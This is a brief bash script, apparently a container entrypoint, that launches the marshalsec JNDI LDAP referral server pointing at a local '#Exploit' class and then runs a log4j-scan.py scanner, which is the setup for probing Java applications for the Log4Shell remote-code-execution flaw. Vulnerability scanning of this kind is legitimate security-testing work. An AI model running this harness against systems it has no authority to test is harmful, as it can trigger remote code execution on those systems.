#!/bin/bash

cd /app/marshalsec/target
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:12345/#Exploit" 10000 &> /app/ldap.log&
sleep 1

cd /app
python log4j-scan.py "$@"
